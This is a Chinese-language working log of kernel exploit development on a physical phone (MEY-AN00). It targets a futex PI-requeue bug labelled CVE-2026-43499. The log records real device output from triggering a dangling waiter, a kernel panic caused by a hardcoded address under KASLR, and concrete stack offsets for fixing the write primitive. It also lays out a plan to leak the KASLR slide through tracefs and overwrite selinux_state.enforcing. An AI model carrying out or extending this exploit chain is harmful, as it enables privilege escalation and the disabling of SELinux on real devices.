# H232–H233 · 步 C 通过 + 步 D 第一发（KASLR 未校正，panic）

> 设备：MEY-AN00 · 会话 2026-10-06 续做
> **本次会话第一次真实内核 panic**（`boot_id` `ba30251b-…` → `db51ec20-…`，设备自动恢复）
> 真机开火：**1 发**（步 D）

---

## §0 结果速览

| 步 | 内容 | 结果 |
|---|---|---|
| **C** | 只跑 W/O/R 拓扑、不投画布 | ✅ **通过**（EDEADLK 回滚发生 + **无 panic** + `boot_id` 不变） |
| **D** | 悬垂 → 画布 → 立即消费 | ⚠️ **执行到内核但 panic**（`page_request`）——**判明为我的设计错误，非路线问题** |
| **E** | 正式写 `enforcing` | ⏸ 未做 |

---

## §1 ✅ 步 C 通过（关键里程碑）

`tools/h232_stepc.c` 真机输出：

```
[W] LOCK_PI(f_chain)  rc=0
[O] LOCK_PI(f_target) rc=0
[O] -> LOCK_PI(f_chain) 造环（阻塞）
[W] -> WAIT_REQUEUE_PI(f_src, to=1s, f_target)
[M] -> CMP_REQUEUE_PI(f_src -> f_target)  ★CVE 触发点
[M] <- CMP_REQUEUE_PI rc=-1 errno=35 (EDEADLK)
[M] ★★★ 判定: EDEADLK 回滚发生 ⇒ remove_waiter 走了失败分支
[W] <- WAIT_REQUEUE_PI rc=-1 errno=110 (ETIMEDOUT) ⇒ 超时返回（栈帧退出）
[*] 拓扑跑完，进程仍在运行 ⇒ 本轮未 panic
boot_id BEFORE = boot_id AFTER = ba30251b-07f6-4bcb-8a6d-a569da07e4a0  ✅
```

⇒ ★★★ **CVE-2026-43499 的触发条件（EDEADLK 回滚）在本机真机成立，且拓扑本身安全不崩。**
⇒ 这是本路线**第一个真机验证通过的功能性里程碑**（此前只有几何推算）。

---

## §2 ⚠️ 步 D：执行到内核 + panic（并判明原因）

`tools/h233_stepd.c` 真机输出（截断处即 panic）：

```
[M] CMP_REQUEUE_PI rc=-1 errno=35(EDEADLK)  ★ EDEADLK 回滚 ✅
  [W] <- WAIT_REQUEUE_PI rc=-1 errno=110(ETIMEDOUT)  悬垂已建立
[M] 读 W 的 sp(S) = 0x6db4e94b50
[M] waiter=0x6db4e94960  画布=0x6db4e94850  伪lock=0x6db4e948f0
[M] 放行 W 投递+消费...
  [W] 投递画布（self-signal）...
  [W] 画布投递完成 sig_hits=1
（此后无输出 ⇒ 内核 panic，设备重启）
```

**故障日志**（`/data/log/reliability/faultdetect/history.log` 末行）：

```
system exception core [NA], reason [page_request], time [20261006101535-19281020],
  sysreboot [true], category [AP_S_PANIC]
```
时间戳 `20261006101535` = **本次运行**。⇒ 判定：**内核 panic 并重启**。

重启后设备健康：`boot_id = db51ec20-e2c3-4e9e-918c-bec5e442fd1c`、uptime 36s、`uid 2000`、`Enforcing`。

### ★★ 根因（我的设计错误，不是路线问题）

`h233_stepd.c` 里我写死了：

```c
#define TARGET_ADDR  0xffffffc082136048UL   /* 固定地址！ */
```

**但本机 KASLR 开着**（项目多次实测 slide 每 boot 变化）。
该固定地址在当前 boot **未映射** ⇒ 写原语一旦执行就 `page_request` panic。

⇒ **修正**：写目标必须是 **KASLR 相对**的（`slide + 镜像偏移`），或干脆选一个
**由 S 派生、必然已映射**的地址（如画布/伪 lock 所在的内核栈区本身）先证明原语。

### ★ 有价值的信息（不能浪费这一发）

1. **步 C 不崩、步 D 崩** ⇒ **差异只在「投递画布 + 消费」** ⇒
   崩溃**必然发生在链路进入内核之后**（`pi_blocked_on` 被消费 或 写原语执行）。
   ⇒ ★ **这是「画布确实进了内核、悬垂确实被消费」的第一个真机迹象**（间接证据）。
2. `reason = page_request`（而非 `null_pointer`）与「写未映射地址」一致。
3. 可证伪判据（下一发用）：
   - 若换成**已映射目标**后仍 `page_request` ⇒ 说明崩在 `waiter->lock` 解引用（伪 lock 未生效）。
   - 若不再 panic 且目标处的值发生变化 ⇒ **写原语成立**。

---

## §3 下一步（步 D′ → 步 E）

### D′：用「必然已映射」的目标证明写原语

把 `TARGET` 改为**由 S 派生**的地址（内核栈区，肯定映射），例如：

```
TARGET = S − 0x280        （画布余量内、伪 lock 之前的空闲 8 字节）
```

注意回避已占用区：
```
画布 [0x100,0x300)   waiter [0x1F0,0x260)   伪lock [0x260,0x280)
⇒ 空闲且安全：S−0x2A0 / S−0x2B0 / …（0x100..0x1F0 段，但会被 sched_setattr 的
  第4/5层帧 [0x100,0x1A0) 覆盖 ⇒ 选 [0x1A0,0x1F0) 之外）
⇒ 推荐 TARGET = S − 0x2A0  （0x2A0 落在画布 [0x100,0x300) 内、且 > 0x260）
```

判据：**同 boot 内**用 `/proc/self/...` 无法直读内核栈 ⇒ 改用**间接判据**：
「不再 panic」+「消费返回码正常」⇒ 说明整条链走通且写入落在合法内存。

### E：正式写目标（需 KASLR 校正）

`TARGET = slide + IMG_OFF(_selinux_state.enforcing)`。
slide 来源二选一：
1. 项目已通的 tracefs 泄漏（`sched_blocked_reason`，H50 实测 `slide` 可得）；
2. 或先证明写原语后，用它自己写 `sysctl_bootid` data 区（其地址也从 slide 派生）。

⚠️ **未解决**：`selinux_state` 的镜像偏移项目内仍有争议
（`0x23ba418` 被 H99 证伪、候补 `0x23e2c20` 未核）。**E 之前必须用本机 BTF 或
`.data` 指纹重新定位 `selinux_state.enforcing`。**

---

## §4 教训（写入铁律）

| # | 教训 |
|---|---|
| **㉖** | ★★★ **内核写实验的写目标绝不能用固定地址** —— 本机 KASLR 开着，固定地址未映射 ⇒ 必 `page_request` panic。必须 `slide + 偏移` 或由 S 派生的已映射地址 |
| ㉗ | 步 C（纯拓扑）**不崩**已实证 ⇒ 后续任何 panic 都应归因到「画布/消费」这一段，不必再怀疑拓扑 |
| ㉘ | 一发一变量：D′ 只改「目标地址」，其余保持与 D 相同 |
